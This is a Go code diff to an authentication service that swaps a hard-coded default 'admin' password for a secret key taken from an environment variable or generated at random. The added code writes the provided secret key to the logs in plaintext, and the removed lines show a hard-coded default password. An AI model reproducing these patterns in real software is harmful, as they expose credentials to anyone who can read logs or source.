@@ -1,56 +1,73 @@
 package services
 
 import (
+	"errors"
+	"fmt"
+	"github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/entities"
 	"github.com/tiagorlampert/CHAOS/internal/utilities"
 	"github.com/tiagorlampert/CHAOS/repositories"
+	"strings"
 )
 
-const defaultPassword = "admin"
-
 type authService struct {
+	logger         *logrus.Logger
+	secretKey      string
 	authRepository repositories.Auth
-	userRepository repositories.User
 }
 
 func NewAuth(
-	authRepository repositories.Auth,
-	userRepository repositories.User) Auth {
+	logger *logrus.Logger,
+	secretKey string,
+	authRepository repositories.Auth) Auth {
 	return &authService{
+		logger:         logger,
 		authRepository: authRepository,
-		userRepository: userRepository,
+		secretKey:      strings.TrimSpace(secretKey),
 	}
 }
 
 func (s authService) Setup() (*entities.Auth, error) {
 	auth, err := s.authRepository.First()
-	if err == nil {
-		return auth, nil
-	}
-	if err := s.authRepository.Insert(
-		entities.Auth{SecretKey: utilities.GenerateRandomString(secretKeySize)},
-	); err != nil {
+	switch err {
+	case nil, repositories.ErrNotFound:
+		break
+	default:
 		return nil, err
 	}
 
-	passwordHash, err := utilities.HashAndSalt(defaultPassword)
-	if err != nil {
-		return nil, err
+	hasProvidedSecretKey := len(s.secretKey) > 0
+	if hasProvidedSecretKey {
+		defer s.logger.WithFields(logrus.Fields{"key": s.secretKey}).
+			Info("Using a provided Secret Key from environment variable")
 	}
-	if err := s.userRepository.Insert(entities.User{
-		Username: "admin",
-		Password: passwordHash,
-	}); err != nil {
-		return nil, err
+
+	if errors.Is(err, repositories.ErrNotFound) {
+		dummyAuth := entities.Auth{}
+		if hasProvidedSecretKey {
+			dummyAuth.SecretKey = s.secretKey
+		} else {
+			dummyAuth.SecretKey = utilities.GenerateRandomString(secretKeySize)
+		}
+		return &dummyAuth, s.authRepository.Insert(dummyAuth)
 	}
-	return s.authRepository.First()
+
+	if hasProvidedSecretKey && auth.SecretKey != s.secretKey {
+		auth.SecretKey = s.secretKey
+		return &auth, s.authRepository.Update(auth)
+	}
+	return &auth, nil
 }
 
-func (s authService) First() (*entities.Auth, error) {
+func (s authService) First() (entities.Auth, error) {
 	return s.authRepository.First()
 }
 
 func (s authService) RefreshSecret() (string, error) {
+	if len(s.secretKey) != 0 {
+		return "", fmt.Errorf("%s", ErrFailedRefreshProvidedSecretKey)
+	}
+
 	auth, err := s.authRepository.First()
 	if err != nil {
 		return "", err
